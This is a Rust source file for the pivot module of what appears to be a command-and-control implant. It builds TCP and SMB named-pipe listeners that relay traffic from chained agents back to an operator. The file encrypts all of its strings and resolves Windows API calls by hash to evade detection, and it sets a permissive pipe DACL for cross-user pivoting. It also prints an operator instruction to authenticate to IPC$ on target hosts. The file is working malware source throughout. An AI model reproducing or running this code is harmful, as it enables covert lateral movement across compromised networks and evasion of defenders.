// src/agent/pivot.rs
use tokio::net::TcpListener;
use tokio::sync::mpsc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use std::sync::{Arc, Mutex};
use std::collections::HashMap;
use crate::common::PivotFrame;
use serde_json;

#[cfg(target_os = "windows")]
use tokio::net::windows::named_pipe::NamedPipeServer;

#[cfg(target_os = "windows")]
use std::ffi::CString;
#[cfg(target_os = "windows")]
use std::ptr;
#[cfg(target_os = "windows")]
use std::ffi::c_void;
use crate::strcrypt_rt;
use strcrypt::aes_str;

pub type StreamMap = Arc<Mutex<HashMap<u32, mpsc::UnboundedSender<Vec<u8>>>>>;

/// One downstream link accepted by a pivot listener.
struct LinkEntry {
    tx: mpsc::UnboundedSender<Vec<u8>>,
    abort: tokio::task::AbortHandle,
}

/// One active pivot listener (pivot:list / pivot:stop).
struct ListenerEntry {
    desc: String,
    abort: tokio::task::AbortHandle,
    /// Live downstream link ids accepted by this listener, so pivot:stop
    /// can tear them down along with the listener itself.
    links: Arc<Mutex<Vec<u32>>>,
}

pub struct PivotManager {
    pub local_streams: StreamMap,
    downstream_links: Arc<Mutex<HashMap<u32, LinkEntry>>>,
    upstream_tx: mpsc::Sender<Vec<u8>>,
    /// Monotonic link-id source shared by every listener task, so two
    /// listeners can never hand the same id to downstream_links (the old
    /// per-listener counters restarted at 5000/8000 and collided).
    next_link_id: Arc<std::sync::atomic::AtomicU32>,
    /// Active listeners keyed by a small operator-facing id (pivot:list /
    /// pivot:stop), independent from the wire link ids.
    listeners: Arc<Mutex<HashMap<u32, ListenerEntry>>>,
    next_listener_id: Arc<std::sync::atomic::AtomicU32>,
}

impl PivotManager {
    pub fn new(upstream_tx: mpsc::Sender<Vec<u8>>) -> Self {
        Self {
            local_streams: Arc::new(Mutex::new(HashMap::new())),
            downstream_links: Arc::new(Mutex::new(HashMap::new())),
            upstream_tx,
            next_link_id: Arc::new(std::sync::atomic::AtomicU32::new(5000)),
            listeners: Arc::new(Mutex::new(HashMap::new())),
            next_listener_id: Arc::new(std::sync::atomic::AtomicU32::new(1)),
        }
    }

    /// Snapshot of active listeners: (id, description, live link count).
    pub fn list_listeners(&self) -> Vec<(u32, String, usize)> {
        let guard = self.listeners.lock().unwrap_or_else(|e| e.into_inner());
        let mut out: Vec<(u32, String, usize)> = guard.iter().map(|(id, e)| {
            let n = e.links.lock().unwrap_or_else(|p| p.into_inner()).len();
            (*id, e.desc.clone(), n)
        }).collect();
        out.sort_by_key(|(id, _, _)| *id);
        out
    }

    /// Shut a listener down: stop accepting, drop its downstream links, and
    /// send a close frame upstream per link so the server can prune the
    /// virtual sessions from the topology view. The close frame is an
    /// empty-data PivotFrame whose metadata is "CLOSE" (ignored by older
    /// servers, which simply prune the idle virtual sessions themselves).
    pub async fn stop_listener(&self, id: u32) -> Result<String, String> {
        let entry = {
            let mut guard = self.listeners.lock().unwrap_or_else(|e| e.into_inner());
            guard.remove(&id)
        };
        let entry = match entry {
            Some(e) => e,
            None => return Err(format!("{}: {}", aes_str!("Listener not found"), id)),
        };
        entry.abort.abort();

        let link_ids: Vec<u32> = {
            let mut guard = entry.links.lock().unwrap_or_else(|e| e.into_inner());
            std::mem::take(&mut *guard)
        };
        let mut closed = 0usize;
        for link_id in link_ids {
            let link = {
                let mut guard = self.downstream_links.lock().unwrap_or_else(|e| e.into_inner());
                guard.remove(&link_id)
            };
            if let Some(link) = link {
                link.abort.abort();
                drop(link.tx);
                closed += 1;
                let close_frame = PivotFrame {
                    stream_id: link_id,
                    destination: 0,
                    source: link_id,
                    data: vec![],
                    metadata: aes_str!("CLOSE"),
                };
                if let Ok(serialized) = serde_json::to_vec(&close_frame) {
                    let _ = self.upstream_tx.send(serialized).await;
                }
            }
        }
        Ok(format!("{} {} {} {} {}",
            aes_str!("Listener"), id, aes_str!("stopped -"), closed, aes_str!("downstream links closed")))
    }

    pub async fn start_agent_listener(&self, port: u16) -> Result<String, String> {
        let listener = match TcpListener::bind(format!("{}:{}", aes_str!("0.0.0.0"), port)).await {
            Ok(l) => l,
            Err(e) => return Err(format!("{}: {}", aes_str!("Bind Error"), e)),
        };

        let downstream_links = self.downstream_links.clone();
        let upstream_tx = self.upstream_tx.clone();
        let link_ids = self.next_link_id.clone();
        let listener_id = self.next_listener_id.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        let listener_links: Arc<Mutex<Vec<u32>>> = Arc::new(Mutex::new(Vec::new()));
        let accept_links = listener_links.clone();

        let accept_task = tokio::spawn(async move {
            loop {
                if let Ok((stream, addr)) = listener.accept().await {
                    let link_id = link_ids.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                    accept_links.lock().unwrap_or_else(|e| e.into_inner()).push(link_id);
                    
                    let (tx, mut rx) = mpsc::unbounded_channel::<Vec<u8>>();

                    let upstream_inner = upstream_tx.clone();
                    let links_inner = downstream_links.clone();
                    let task_links = accept_links.clone();

                    let init_frame = PivotFrame {
                        stream_id: link_id,
                        destination: 0,
                        source: link_id,
                        data: vec![],
                        metadata: addr.to_string(),
                    };
                    if let Ok(serialized) = serde_json::to_vec(&init_frame) {
                        let _ = upstream_inner.send(serialized).await;
                    }

                    let link_task = tokio::spawn(async move {
                        let (mut reader, mut writer) = tokio::io::split(stream);
                        let mut buf = [0u8; 8192];

                        loop {
                            tokio::select! {
                                n = reader.read(&mut buf) => {
                                    match n {
                                        Ok(n) if n > 0 => {
                                            let frame = PivotFrame {
                                                stream_id: link_id,
                                                destination: 0,
                                                source: link_id,
                                                data: buf[..n].to_vec(),
                                                metadata: String::new(),
                                            };
                                            if let Ok(serialized) = serde_json::to_vec(&frame) {
                                                let _ = upstream_inner.send(serialized).await;
                                            }
                                        },
                                        _ => break,
                                    }
                                },
                                Some(data) = rx.recv() => {
                                    if writer.write_all(&data).await.is_err() { break; }
                                    let _ = writer.flush().await;
                                }
                            }
                        }
                        links_inner.lock().unwrap_or_else(|e| e.into_inner()).remove(&link_id);
                        task_links.lock().unwrap_or_else(|e| e.into_inner()).retain(|&id| id != link_id);
                    });

                    downstream_links.lock().unwrap_or_else(|e| e.into_inner())
                        .insert(link_id, LinkEntry { tx, abort: link_task.abort_handle() });
                }
            }
        });

        self.listeners.lock().unwrap_or_else(|e| e.into_inner()).insert(listener_id, ListenerEntry {
            desc: format!("{} {}", aes_str!("tcp:"), port),
            abort: accept_task.abort_handle(),
            links: listener_links,
        });

        Ok(format!("{} {} ({} {})", aes_str!("TCP Pivot Listener started on port"), port,
            aes_str!("listener id"), listener_id))
    }

    #[cfg(target_os = "windows")]
    pub async fn start_named_pipe_listener(&self, pipe_name: String) -> Result<String, String> {
        let full_path = format!("{}{}", aes_str!(r"\\.\pipe\"), pipe_name);
        // Create the first pipe instance EAGERLY (same philosophy as the
        // TCP bind): an invalid name or a collision must surface here as
        // Err, not as a silently retrying accept task. A named pipe needs
        // a fresh instance per client, so the task re-creates from the
        // second connection on.
        let first_server = match create_security_pipe(&full_path) {
            Ok(s) => s,
            Err(e) => return Err(format!("{}: {}", aes_str!("Pipe Create Error"), e)),
        };
        let downstream_links = self.downstream_links.clone();
        let upstream_tx = self.upstream_tx.clone();

        let path_clone = full_path.clone();
        let link_ids = self.next_link_id.clone();
        let listener_id = self.next_listener_id.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        let listener_links: Arc<Mutex<Vec<u32>>> = Arc::new(Mutex::new(Vec::new()));
        let accept_links = listener_links.clone();
        // The accept loop owns this copy for init-frame metadata; the
        // original stays here for the listener registry description.
        let pipe_name_task = pipe_name.clone();

        let accept_task = tokio::spawn(async move {
            let mut pending = Some(first_server);
            loop {
                // First iteration uses the eagerly created instance; later
                // iterations create a fresh one per client (Authenticated
                // Users (AU) permission).
                let server = match pending.take() {
                    Some(s) => s,
                    None => match create_security_pipe(&path_clone) {
                        Ok(s) => s,
                        Err(e) => {
                            if crate::agent::config::load().debug {
                                eprintln!("{}: {}", aes_str!("[Pivot] Pipe Create Error"), e);
                            }
                            tokio::time::sleep(std::time::Duration::from_secs(5)).await;
                            continue;
                        }
                    },
                };

                if let Ok(_) = server.connect().await {
                    let link_id = link_ids.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                    accept_links.lock().unwrap_or_else(|e| e.into_inner()).push(link_id);

                    let (tx, mut rx) = mpsc::unbounded_channel::<Vec<u8>>();

                    let upstream_inner = upstream_tx.clone();
                    let links_inner = downstream_links.clone();
                    let task_links = accept_links.clone();

                    let init_frame = PivotFrame {
                        stream_id: link_id,
                        destination: 0,
                        source: link_id,
                        data: vec![],
                        metadata: format!("{}{}", aes_str!("SMB:"), pipe_name_task),
                    };
                    if let Ok(serialized) = serde_json::to_vec(&init_frame) {
                        let _ = upstream_inner.send(serialized).await;
                    }

                    let link_task = tokio::spawn(async move {
                        let (mut reader, mut writer) = tokio::io::split(server);
                        let mut buf = [0u8; 8192];

                        loop {
                            tokio::select! {
                                n = reader.read(&mut buf) => {
                                    match n {
                                        Ok(n) if n > 0 => {
                                            let frame = PivotFrame {
                                                stream_id: link_id,
                                                destination: 0,
                                                source: link_id,
                                                data: buf[..n].to_vec(),
                                                metadata: String::new(),
                                            };
                                            if let Ok(serialized) = serde_json::to_vec(&frame) {
                                                let _ = upstream_inner.send(serialized).await;
                                            }
                                        },
                                        _ => break,
                                    }
                                },
                                Some(data) = rx.recv() => {
                                    if writer.write_all(&data).await.is_err() { break; }
                                }
                            }
                        }
                        links_inner.lock().unwrap_or_else(|e| e.into_inner()).remove(&link_id);
                        task_links.lock().unwrap_or_else(|e| e.into_inner()).retain(|&id| id != link_id);
                    });

                    downstream_links.lock().unwrap_or_else(|e| e.into_inner())
                        .insert(link_id, LinkEntry { tx, abort: link_task.abort_handle() });
                }
            }
        });

        self.listeners.lock().unwrap_or_else(|e| e.into_inner()).insert(listener_id, ListenerEntry {
            desc: format!("{} {}", aes_str!("smb:"), pipe_name),
            abort: accept_task.abort_handle(),
            links: listener_links,
        });

        // Return string includes the operator hint about IPC$ auth on the
        // destination host.
        Ok(format!(
            "{} {} {} ({} {}) {}",
            aes_str!("SMB Named Pipe Listener started at"),
            full_path,
            aes_str!("(Authenticated Users Only)."),
            aes_str!("listener id"), listener_id,
            aes_str!("\n\n[!] REQUIRED: Destination hosts must have an authenticated session to this machine.\n    Run on Target: net use \\\\<PIVOT_IP>\\IPC$ /user:<USERNAME> <PASSWORD>")
        ))
    }

    #[cfg(not(target_os = "windows"))]
    pub async fn start_named_pipe_listener(&self, _pipe_name: String) -> Result<String, String> {
        Err(aes_str!("Error: Named Pipes are Windows-only."))
    }

    pub fn handle_downstream_frame(&self, frame: PivotFrame) {
        let guard = self.downstream_links.lock().unwrap_or_else(|e| e.into_inner());
        if let Some(link) = guard.get(&frame.destination) {
            let _ = link.tx.send(frame.data);
        }
    }
}

// --- WINDOWS FFI FOR AUTHENTICATED PIPE CREATION ---

#[cfg(target_os = "windows")]
fn create_security_pipe(path: &str) -> std::io::Result<NamedPipeServer> {
    use tokio::net::windows::named_pipe::ServerOptions;

    // Step 1: Create pipe via Tokio's ServerOptions (guarantees IOCP registration).
    // from_raw_handle does NOT always register with the Tokio reactor properly,
    // causing .read().await / .write().await to block forever or EWOULDBLOCK.
    let pipe = ServerOptions::new()
        .first_pipe_instance(false)
        .create(path)?;

    // Step 2: Apply a permissive DACL via SetKernelObjectSecurity.
    // This is needed for cross-user pivoting (e.g., SYSTEM -> user agent).
    unsafe {
        use std::os::windows::io::AsRawHandle;
        let handle = pipe.as_raw_handle();

        let sddl = CString::new(aes_str!("D:(A;;GA;;;AU)")).unwrap();
        let mut sd: *mut c_void = ptr::null_mut();

        if ConvertStringSecurityDescriptorToSecurityDescriptorA(
            sddl.as_ptr(), 1, &mut sd, ptr::null_mut(),
        ) != 0 {
            // DACL_SECURITY_INFORMATION = 0x04
            /// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
            unsafe fn SetKernelObjectSecurity(handle: *mut c_void, info: u32, sd: *mut c_void) -> i32 {
                type F = unsafe extern "system" fn(*mut c_void, u32, *mut c_void) -> i32;
                static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
                let p = *P.get_or_init(||
                    crate::agent::injection::win_resolve::resolve_ptr(
                        b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"SetKernelObjectSecurity")));
                let f: F = unsafe { std::mem::transmute(p) };
                unsafe { f(handle, info, sd) }
            }
            SetKernelObjectSecurity(handle as *mut c_void, 0x04, sd);
            LocalFree(sd);
        }
    }

    Ok(pipe)
}

// --- FFI DEFINITIONS ---
#[cfg(target_os = "windows")]
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
unsafe fn LocalFree(hMem: *mut c_void) -> *mut c_void {
    type F = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"LocalFree")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(hMem) }
}

#[cfg(target_os = "windows")]
/// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
unsafe fn ConvertStringSecurityDescriptorToSecurityDescriptorA( StringSecurityDescriptor: *const i8, StringSDRevision: u32, SecurityDescriptor: *mut *mut c_void, SecurityDescriptorSize: *mut u32, ) -> i32 {
    type F = unsafe extern "system" fn(*const i8, u32, *mut *mut c_void, *mut u32) -> i32;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"ConvertStringSecurityDescriptorToSecurityDescriptorA")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(StringSecurityDescriptor, StringSDRevision, SecurityDescriptor, SecurityDescriptorSize) }
}
